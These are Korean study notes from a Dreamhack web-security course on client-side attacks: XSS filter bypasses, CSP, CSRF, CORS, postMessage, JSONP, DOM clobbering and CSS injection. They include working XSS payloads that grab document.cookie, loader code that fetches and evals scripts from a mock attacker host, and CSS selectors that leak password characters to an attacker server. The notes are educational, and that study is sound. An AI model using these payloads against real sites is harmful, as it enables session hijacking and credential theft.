---
title: "[모각코] #4 드림핵 4강 Client-side Advanced"
categories:
  - Hacking
  - MGK
tags:
  - Hacking
  - MGK
toc: true
toc_sticky: true
---

# Client-side Advanced



# Cross-Site Scripting (XSS)

* **방어 방법**:  

사용자가 **HTML 태그나 엔티티 자체를 입력하지 못하도록** 하고, 대신 입력을 **서식 없는 평문(plaintext)**으로 취급

>  `<`, `>`, `&` 와 같은 특수 문자들을 Escape하고, 클라이언트 측에서는 DOM의 `textContent` 또는 `createTextNode`를 사용해 HTML 태그 등이 해석되는 것을 방지



* 배경: 

  - 유산(legacy) : 서로 자신의 웹 브라우저가 해석할 수 있는 HTML에 별다른 규율 없이 태그 등을 늘려 나갔고, 표준화가 제대로 정립되기 전까지 쌓여온 이 기능들은 현재에 들어서 잘 쓰이지 않거나 오히려 불편함을 야기

    

* **태그 및 속성 필터링**

  * **속성**

    ex)  `load`와 `error`

    

  * **취약한 필터 예시**

    - 대문자 혹은 소문자만을 인식하는 필터 우회

    ```html
    x => !x.includes('script') && !x.includes('On')--> <sCRipT>alert(document.cookie)</scriPT>--> <img src=x: oneRroR=alert(document.cookie) />
    ```

    - 잘못된 정규표현식을 사용한 필터 우회

    ```html
    x => !/<script[^>]*>[^<]/i.test(x)--> <sCrIpt src=data:,alert(document.cookie)></SCRipt>// 스크립트 태그 내에 데이터가 존재하는지 확인하는 필터링 -> src 속성을 이용하여 데이터 입력.
        
    x => !/<script[^>]*>[^<]/i.test(x) && !x.includes('document')--> <sCrIpt src=data:;base64,YWxlcnQgKGRvY3VtZW50LmNvb2tpZSk7></SCRipt>// base64 인코딩을 통해 필터링 우회
    
    x => !/<img[^>]*onerror/i.test(x)--> <<img src=> onerror=alert(document.cookie)>--> <img src='>' onerror=alert(document.cookie)//\>
    
    x => !/<img([^>]|['"][^'"]*['"])+onerror/i.test(x)--> <img src=">'>" onerror=alert(document.cookie) />
        
    x => !/<img.*on/i.test(x)--> <img src=""     
                                      onerror = alert(document.cookie) />// 멀티라인에 대한 검증이 존재하지 않아 줄바꿈을 통해 필터링 우회.
    ```

    - 특정 태그 및 속성에 대한 필터링을 다른 태그 및 속성을 이용하여 필터 우회

    ```html
    x => !/img|onload/i.test(x)--> <video><source onerror=alert(document.cookie) /></video>
    x => !/onerror/i.test(x)--> <body onload=alert(document.cookie) />
    x => !/<\s*body/i.test(x)--> <iframe src=jaVaSCRipt:alert(parent.document.cookie) />
    x => !/onerror|javascript/i.test(x)--> <iframe srcdoc="<img src='' one&#114;&#114;or=alert(parent.document.cookie)>"
    
    ```

* **JavaScript 함수 및 키워드 필터링**

  * JavaScript:

    * **Unicode escape sequence**

      ->  문자열에서 유니코드 문자를 코드포인트로 나타낼 수 있는 표기)

      ex) (`"\uAC00"` = **"가")** 

    * **computed member access**

      -> 객체의 특정 속성을 접근할 때 속성 이름을 동적으로 계산함 등 코드를 난독화할 수 있는 다양한 기능들을 포함

  * **우회 방법**

    ##### 1. **문자열 선언**

    - **일반적인 방법**

      quotes(`"`, `'`) 또는 Template literals 사용

    ```js
    var foo = "Hello";
    var bar = "World";
    
    var baz = `${foo},
    World ${1+1} `; // "Hello,\nWorld 2 "
    /*
    Template literals은 backtick을 통해 선언하며 멀티라인 문자열도 선언할 수 있습니다.또한 내장된 표현식을 통해 다른 변수 또는 식을 사용할 수 있습니다.
    */
    ```

    - quotes 또는 Template literals을 사용하지 못하는 경우

    ```js
    var foo = /Hello World!/.source;// "Hello World!"
    var foo2 = /test !/ + []; // "/test !/"
    /*
    RegExp Object의 pattern 부분을 이용.
    /test/.constructor === RegExp
    */
    var bar = String.fromCharCode(72, 101, 108, 108, 111); // Hello
    /*
    String.fromCharCode함수는 유니코드의 범위 중 해당 수에 해당 하는 문자를 반환.*/
    var baz = history.toString()[8] + // "H"(history+[])[9] + // "i"
    (URL+0)[12] + // "("
    (URL+0)[13]; // ")" ==> "Hi()"
    /*기본 내장 함수 또는 오브젝트의 문자를 사용하는 방법.
    history.toString(); ==> "[object History]" URL.toString(); ==> "function URL() {
    [native code] }"
    history+[]; history+0; // 연산을 위해 history 오브젝트에서 toString() 함수가 실행된다.*/
    var qux = 29234652..toString(36); // "hello"
    var qux2 = 29234652 .toString(36); // "hello"// parseInt("hello", 36); ==> 29234652/*E4X operator("..") 연산자를 이용하여 number 오브젝트에 접근.또한, 숫자 속성에 접근 시, 앞에 공백을 한 칸 추가해 점이 소수점으로 인식되지 않도록 하는 방법도 있습니다.*/
    ```

    ##### **2. 함수 호출**

    - 일반적인 방법

      괄호(Parentheses, `()`) 또는 Tagged templates 사용

    ```js
    alert(1);
    alert`1`;
    ```

    

    - 괄호 또는 Tagged templates를 사용하지 못하는 경우

    ```js
    location="javascript:alert\x281\x29;";
    location.href="javascript:alert\u00281\u0029;";
    location['href']="javascript:alert\0501\051;";
    /*javascript scheme 을 통해 함수 실행.*/
    "alert\x281\x29"instanceof{[Symbol.hasInstance]:eval};
    Array.prototype[Symbol.hasInstance]=eval;"alert\x281\x29"instanceof[];
    /*JavaScript에서는 문자열 이외에도 ECMAScript 6에서 추가된 Symbol 또한 속성 명칭으로 사용할 수 있습니다.Symbol.hasInstance well-known symbol을 이용하면 instanceof 연산자를 override할 수 있습니다.즉, (O instanceof C)를 연산할 때 C에 Symbol.hasInstance 속성에 함수가 있을 경우 메소드로 호출하여 instanceof 연산자의 결과값으로 사용하게 됩니다.이 특성을 이용해 instanceof를 연산하게 되면 실제 인스턴스 체크 대신 원하는 함수를 메소드로 호출되도록 할 수 있습니다.*/
    document.body.innerHTML+="<img src=x: onerror=alert&#40;1&#41;>";
    /*document에 새로운 html 추가를 통해 자바스크립트 실행. */
    ```

  ##### 3. **문자열 치환**

  -> 문자열을 넣으면 최종적으로 바깥에 필터링되는 문자열이 다시 나타나게 되어 필터가 무력화될 뿐더러 웹 응용 방화벽(Web Application Firewall) 등에서 탐지하지 못하게되는 부작용이 발생

  * **대안 방식**

    ->**문자열에 변화가 없을 때까지 지속적으로 치환하는 방식**

    ​		=> 문자열에 변화가 없을 때까지 지속적으로 치환하는 방식

    ```js
    function replaceIterate(text) {    
        while (true) {        
            var newText = text           
            	.replace(/script|onerror/gi, '');        
            if (newText === text) break;        
            text = newText;    
        }    
        return text;
    }
    replaceIterate('<imgonerror src="data:image/svg+scronerroriptxml,&lt;svg&gt;" onloadonerror="alert(1)" />')
    --> <img src="data:image/svg+xml,&lt;svg&gt;" onload="alert(1)" />
    
    replaceIterate('<ifronerrorame srcdoc="&lt;sonerrorcript&gt;parent.alescronerroriptrt(1)&lt;/scrionerrorpt&gt;" />')
    --> <iframe srcdoc="&lt;script&gt;parent.alert(1)&lt;/script&gt;" />
    ```

  ##### 4. 활성 하이퍼 링크

  ​	-> HTML 요소 속성에서 엔티티를 사용할 수 있다는 점을 이용

  ​	=> JavaScript에서는 `URL` 객체를 통해 URL을 직접 정규화할 수 있으며, `protocol`, `hostname` 등 URL의 각종 정보를 추출

  ​	ex) 

  ```js
  function normalizeURL(url) {        
      return new URL(url, document.baseURI);
  }
  normalizeURL('\4\4jAvaScRIpT:alert(1)')
  -->"javascript:alert"
  
  normalizeURL('\4\4jAvaScRIpT:alert(1)').protocol
  --> "javascript:"
  normalizeURL('\4\4jAvaScRIpT:alert(1)').pathname
  --> "alert(1)"
  ```

  ##### 5. 디코딩 전 필터링

  ​	->웹 방화벽 등의 필터링 기능에 의존하거나, 데이터를 개별 요소를 추출하기 전에 전체 데이터(JSON, Form data 등)에 필터를 가하는 경우

  ex)

  ```html
  POST /search?query=%253Cscript%253Ealert(document.cookie)%253C/script%253E HTTP/1.1
  ...
  -----
  HTTP/1.1 200 OK
  <h1>Search results for: <script>alert(document.cookie)</script></h1>
  ```

  ##### 6. 길이 제한

  ->다른 경로로 실행할 추가적인 코드(payload)를 URL fragment 등으로 삽입 후 삽입 지점에는 본 코드를 실행하는 짧은 코드(launcher) 사용

  ​	1. location.hash 를 이용한 공격 방식

```html
https://example.com/?q=<img onerror="eval(location.hash.slice(1))">#alert(document.cookie); 
```

​			2. 외부 자원을 이용한 공격 방식

```html
import("http://malice.dreamhack.io");
var e = document.createElement('script')
e.src='http://malice.dreamhack.io';
document.appendChild(e);
fetch('http://malice.dreamhack.io').then(x=>eval(x.text()))
```



* **흔히 사용되는 구문 &필터 우회를 위해 사용될 수 있는 대체 예시**

  | 구문                                                         | 대체 구문                                                    |
  | ------------------------------------------------------------ | ------------------------------------------------------------ |
  | `alert`, `XMLHttpRequest` 등 최상위 객체 및 함수             | `window['al'+'ert']`, `window['XMLHtt'+'pRequest']` 등 이름 끊어서 쓰기 |
  | `window`                                                     | `self`                                                       |
  | `this`(`"use strict"` 가 비활성화되어 있고 `this` 가 명시된 메소드 호출이 아니라는 가정 하) |                                                              |
  | `eval(code)`                                                 | `Function(code)()`                                           |
  | `Function`                                                   | `isNaN['constr'+'uctor']` 등 함수의 `constructor` 속성 접근  |



# CSP

* **CSP:**

  XSS 공격이 발생하였을 때 그 피해를 줄이고 웹 관리자가 공격 시도를 보고받을 수 있도록 하는 기술

  **-> XSS 등 공격의 피해를 완전히 무력화하기 위한 수단은 아니기 때문에 XSS에 대한 자체적인 방어가 병행되어야 함**

  

* **CSP에서 기본적으로 사용할 수 있는 Origin 명세**

  | 종류                 | 설명                                                         | 예시                                                         |
  | -------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
  | <host-source>        | 호스트와 포트로 판별합니다.                                  | `https://*.dreamhack.io` `dreamhack.io:443` `http://insecure.dreamhack.io` |
  | <scheme-source>      | URL 스키마로 판별합니다.                                     | `http:`, `https:`, `data:`, `blob:`, ...                     |
  | `'self'`             | 같은 Origin의 자원만 허용합니다.                             | `'self'`                                                     |
  | `'unsafe-eval'`      | `eval`() 등 안전하지 않은 함수를 허용합니다.                 | `'unsafe-eval`                                               |
  | `'unsafe-inline'`    | 유효한 nonce나 해쉬가 지정되지 않은 `<script>`, `javascript:` URL 등을 허용합니다. | `'unsafe-inline'`                                            |
  | `'none'`             | 어떤 Origin도 허용하지 않습니다.                             | `'none'`                                                     |
  | `nonce-<base64>`     | Base64로 지정된 nonce를 지정합니다.                          | `'nonce-CAxn148fFUvd9u3201Gy='`                              |
  | `<hashalg>-<base64>` | Base64로 지정된 해쉬 값을 사용하여 추후 로드되는 자원의 해쉬와 비교합니다. | `sha384-OLBgp1GsljhM2TJ+sbHjaiH9txEUvgdDTAzHv2P24donTt6/529l+9Ua0vFImLlb3g==` |

* **CSP 우회**

  * **신뢰하는 도메인에 업로드**

    -> 브라우저가 특정 웹 사이트에서만 자원을 불러오게끔 제한

    

  * **nonce 예측 가능**

    - 따로 도메인이나 해쉬 등을 지정하지 않아도 공격자가 예측할 수 없는 특정 `nonce` 값이 태그 속성에 존재할 것을 요구함으로써 XSS 공격을 방어

    *  **`nonce` 값을 담고 있는 HTTP 헤더 또는 `<meta>` 태그가 캐시되지 않는지 주의**

    * `nonce` 값은 공격자가 예측할 수 없는 난수 값이어야기 때문에 보안상 안전한 의사 난수 생성기(CSPRNG)를 사용하는 것이 좋음

      

  * **base-uri 미지정**

    - HTML에서 하이퍼링크에서 상대 경로를 지정하면 브라우저는 마치 파일 경로처럼 기본적으로 현재 문서를 기준으로 주소를 해석

    - **공격자가 마크업을 삽입시, 추후 상대 경로를 사용하는 URL들은 본래 의도한 위치가 아닌 공격자의 서버에 자원을 가리키게 됨**

      -> **공격자는 이를 통해 임의의 스크립트 등을 삽입**

      

# CSRF

### CSRF Token

* **CSRF Token:**

  같은 Origin에서만 접근 가능한 형태로 특정 토큰을 저장해 제3자가 아닌 사용자로부터 요청이 왔다는 것을 인증할 수 있는 방법

* **용도:**

  CSRF Token 값은 보통 HTML Form의 `hidden` 필드로 입력되나, 동적 요청에서도 사용



# CORS

* **취약점 종류**

  1. **현재 사이트에서 다른 사이트로 정보 유출(기밀성)**

     -> CSRF Token 값은 보통 HTML Form의 `hidden` 필드로 입력되나, 동적 요청에서도 사용

     

  2. **다른 사이트에서 현재 사이트 변조(무결성)**

     -> CORS 요청의 Origin이 신뢰할 수 있는 출처인지 확인 또는 제한하지 않거나 CORS 응답을 그대로 사용할 경우 XSS 등 보안 문제가 발생

### window.postMessage API

​	-> Origin을 횡단하여 메시지를 주고받을 수 있는 API

* **메시지를 전송할 때에는 대상 윈도의 `postMessage` 메소드를 호출하며, 수신하는 윈도는 `message` 전역 이벤트를 청취하여 메시지를 받을 수 있음**

  

* ```
  targetWindow.postMessage(message, targetOrigin[, transfer])
  ```

  | 변수           | 설명                                                         |
  | -------------- | ------------------------------------------------------------ |
  | `targetWindow` | 메시지를 보낼 대상 Window                                    |
  | `message`      | 메시지 객체 (함수, DOM 객체 등은 보낼 수 없음)               |
  | `targetOrigin` | 메시지 송신 시점에 `targetWindow`의 Origin이 `targetOrigin`과 일치하여야 함. `targetOrigin`에 `"*"`을 지정하면 Origin 검사가 이루어지지 않음. |
  | `transfer`     | (선택사항) `ArrayBuffer`나 canvas context 등 소유권을 전이할 객체의 배열을 지정. |



* `message` 이벤트 (`MessageEvent`)

  | 고유 속성 | 설명                             |
  | --------- | -------------------------------- |
  | `origin`  | 메시지를 송신한 Origin 반환      |
  | `source`  | 메시지를 송신한 Window 객체 반환 |
  | `data`    | 복사된 메시지 객체 또는 값 반환  |

  

* **Window.postMessage 사용시 취약점**

  * **Origin 미확인**

    -**> SOP를 우회하여 자유자재로 다른 윈도와 통신할 수 있도록 만들어진 API이기 때문에 Origin 검사 또한 웹 개발자의 책임**

    -> 특정 윈도는 모든 Origin에서 오는 메시지를 수신할 수 있는데, 이때 `message` 이벤트 핸들러에서 `origin` 속성을 검사하지 않고 메시지의 내용을 신뢰하면 보안 문제가 발생

    

  * **Origin 전환 경합 조건**

    ※ `postMessage`를 사용할 때 메시지를 보내는 대상이 **웹 문서**가 아닌 **창(윈도)**이라는 것 기억!

    -> **창의 경우에는 사용자가 하이퍼링크를 방문하거나 스크립트가 다른 문서로 Redirect시켜 들어 있는 문서가 바뀔 수 있음**

    

    ◆ **해결 방법**

    **-> `postMessage`의 두 번째 매개변수 `targetOrigin`에 대상 Origin 문자열을 명시**

    

  ### JSONP

  -> **CORS 기술이 도입되기 전 SOP를 우회하기 위해 흔히 쓰였던 방식**



* **취약점**

  * **Origin 검사 부재로 인한 CSRF**

    => **JSONP는 전적으로 HTTP GET 메소드에 의존하기 떄문에  CSRF 공격에 더 취약함**

    * **해결 방법:** 

      민감한 정보를 반환하거나 권한이 필요한 작업을 수행하는 경우 JSONP 요청을 처리할 때마다 요청자의 Origin을 검사

      

  * **콜백 함수명 검증 부재로 인한 제공자 XSS **

    => **콜백명에 HTML 코드 등을 삽입한다면 브라우저는 이를 HTML로 인식할 수 있고, 이 경우 XSS 취약점이 발생**

    * **해결 방법**:

      -> 콜백명에 필터를 적용 

      -> JSONP 요청을 처리할 때 HTTP `Accept` 헤더에 `text/javascript` MIME 타입이 포함되어 있는지 검사

      ->  `Content-Type: text/javascript` 설정 및 `X-Content-Type-Options: nosniff` 헤더로 응답이 자바스크립트가 아닌 다른 콘텐츠로 인식되는 경우를 방지

      

  * **JSONP API 침해 사고 발생 시 사용자 XSS**

    => **JSONP API가 침해 사고를 당해 악의적인 응답이 돌아온다면 이를 사용하는 모든 사이트는 XSS 공격**



### 	CORS 정책

​		-> **서버가 HTTP 응답 헤더를 통해 직접 허용하고자 하는 Origin을 지정할 수 있도록 하는 기술**

  * **과정**

    * CORS 요청을 보낼 때 브라우저는 먼저 대상 웹 서버에 `OPTIONS` 메소드를 가진 예행(**pre-flight**) 요청을 추가로 보냄

      * **`OPTIONS` 헤더를 지원하지 않는 경우:**

      ​		-> CORS 표준에 맞지 않는 응답을 보내게 되고 요청은 중단

      * **서버가 CORS 정책을 지원**:

        -> `OPTIONS` 요청의 응답에 허용되는 Origin 등의 정보를 보냄

* **CORS와 관련된 HTTP 헤더**

  | 헤더 이름                          | 설명                                                      |
  | ---------------------------------- | --------------------------------------------------------- |
  | `Access-Control-Allow-Origin`      | 요청이 허용되는 Origin 지정, `*` 의 경우 모든 Origin 허용 |
  | `Access-Control-Allow-Credentials` | 요청에 신원 정보(쿠기 등)이 포함될 수 있는지 지정         |
  | `Access-Control-Allow-Methods`     | 요청에 허용되는 메소드 지정                               |
  | `Access-Control-Allow-Headers`     | 요청에 허용되는 헤더 지정                                 |
  | `Access-Control-Expose-Headers`    | 웹 클라이언트가 접근할 수 있는 응답 헤더 지정             |
  | `Access-Control-Max-Age`           | CORS 정책이 캐시될 수 있는 최대 기간 지정                 |



* **CORS 정책을 요청하는 클라이언트의 헤더**

  | 헤더 이름                        | 설명                                                         |
  | -------------------------------- | ------------------------------------------------------------ |
  | `Access-Control-Request-Headers` | `OPTIONS` 요청이 끝나고 실제 요청을 보낼 때 포함될 헤더의 목록을 지정합니다. |
  | `Access-Control-Request-Method`  | `OPTIONS` 요청이 끝나고 실제 요청을 보낼 때 사용될 HTTP 메소드 이름을 지정합니다. |



# Exploit Techniques



## Relative Path Overwrite

* **RPO(Relative Path Ovewrite)**:

  PHP 등 일부 CGI형태 웹 스크립트에서 스크립트명 이하의 경로를 지정해도 같은 페이지가 조회되나 상대 경로 자원 참조는 이에 따라 변하지 않는 경우를 이용한 공격

* **방어 방법**

  - CSS, JavaScript 등을 참조할 때 절대 경로(e.g. `/js/util.js` 또는 `https://mydomain/js/util.js`)를 사용

  *  `X-Content-Type-Options: nosniff` 등으로 HTML 페이지가 CSS나 JavaScript로 해석되지 않도록 하기
  * 동적 웹 페이지 CGI 또는 `$_SERVER`의 `PATH_INFO` 변수를 확인하여 만일 RPO 공격이 탐지될 경우 처리를 중단



## DOM Clobbering

**: HTML에서 사용되는 식별자 속성을 이용해 자바스크립트에서 접근 가능한 (DOM) 객체들의 속성 및 메소드 등을 변조하는 기법**

* **취약점**

  -> 기존 브라우저는 스크립트 작성자의 편의를 위해 DOM 노드(원소 등)에서 자식 노드 등을 직접 접근

  => **HTML 마크업이 사용자나 제3자로부터 제공된다면 문제가 발생**

  => **글로벌 변수 이름공간이나 요소 객체 속성은 미리 정의된 속성(e.g. `element.innerHTML`, `window.open` 등)과 충돌할 수 있으며, 프로그래머가 예상했던 것과 다른 값이 반환**



* **방어 방법**

  -> **간접적 메소드 호출 및 접근자를 사용**

  ex)  `HTMLFormElement.prototype.reset.call(elm)` , `Object.getOwnPropertyDescriptor(Node.prototype, 'textContent').set.call(elm, '')` 와 같은 형태를 활용하면 실제 객체에 어떤 속성에 정의되었느냐에 상관없이 본래 속성을 접근

  **-> 번거로움 & third-party 라이브러리(e.g. `jQuery`)와의 상호 작용에서 취약점이 발생할 가능성**



## Template / DOM XSS

-> XSS 공격은 보통 서버에서 데이터를 제대로 검증하거나 필터하지 않은 채 HTML 문서에 포함시켜 발생하지만, **클라이언트에서 발생 가능**

* **DOM**

  -> DOM에서 `innerHTML`, `outerHTML`, `insertAdjacentHTML` 등은 스크립트에서 HTML 마크업을 삽입



* **방어 방법**

  **-> 가급적 `innerHTML`와 같이 마크업을 해석하는 속성의 사용을 피하기**

  **-> 부득이 서식 등 마크업 입력이 필요한 경우 서버측 XSS 방어와 같이 XSS 필터를 이용하여 안전한 마크업만이 삽입**



## CSS Injection

-> CSS(Cascading Style Sheets)의 **Attribute Selectors**와 HTTP 요청을 생성할 수 있는 문법들을 이용해 현재 문서의 정보를 획득하거나, CSRF 공격으로 연계

### 	Attribute Selectors

```css
<p name="test">http://dreamhack.io</p>
<style>p[name=test] {
    color: red;
}
</style>
```

​	-> p 태그 중 name속성의 값이 `test`인 태그를 지정하여 color를 red로 설정하는 CSS문법



### 	HTTP Send

```css
<style>@import url("http://example.com/");/* 외부 자원의 CSS 로드 */body { background: url("http://example.com/"); }/* 해당 태그의 백그라운드 이미지 지정. */</style>
```

​	-> 위와 같은 문법들을 통해 HTTP를 요청을 생성 가능



* **공격 방법**

  - 공격 페이로드 - 1

    ```css
    input[name='userpw'][value^='a']{background: url("http://hacker.dreamhack.com/a");}
    input[name='userpw'][value^='b']{background: url("http://hacker.dreamhack.com/b");}
    input[name='userpw'][value^='c']{background: url("http://hacker.dreamhack.com/c");}
    ...
    input[name='userpw'][value^='S']{background: url("http://hacker.dreamhack.com/S");}
    ```

    -**> 해당 HTTP 요청을 받는 공격자는 password의 첫 단어가 `S` 라는 점을 알 수 있음**

  - 공격 페이로드 - 2

    ```css
    input[name='userpw'][value^='Sa']{background: url("http://hacker.dreamhack.com/Sa");}
    input[name='userpw'][value^='Sb']{background: url("http://hacker.dreamhack.com/Sb");}
    input[name='userpw'][value^='Sc']{background: url("http://hacker.dreamhack.com/Sc");}
    ...
    input[name='userpw'][value^='Su']{background: url("http://hacker.dreamhack.com/Su");}
    ```

    **-> 첫 단어가 `S` 라는 점을 알게된 후 다시 한번 요청하여 다음 단어를 획득**

  ### **Attribute Selectors syntax**

  | syntax            | 설명                                   | 만족하는 예시                  |
  | ----------------- | -------------------------------------- | ------------------------------ |
  | `[value^='a']`    | a로 시작하는 경우                      | `<value="abc">`                |
  | `[value$='a']`    | a로 끝나는 경우                        | `<value="cba">`                |
  | `[value*='a']`    | a가 포함되어 있는 경우                 | `<value="bab">`                |
  | `[value='ABC' i]` | abc이며 대소문자 구분를 하지 않는 경우 | `<value="abc">``<value="ABC">` |

